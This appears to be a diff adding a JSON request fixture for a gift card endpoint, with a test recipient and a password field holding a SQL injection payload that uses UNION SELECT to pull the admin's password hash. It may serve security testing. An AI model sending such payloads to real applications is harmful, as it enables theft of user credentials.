@@ -1,0 +1,5 @@
+{
+  "giftcard_amount": "100",
+  "recipient": "test2",
+  "password": "' UNION SELECT password_hash FROM users WHERE username='admin'; --"
+}
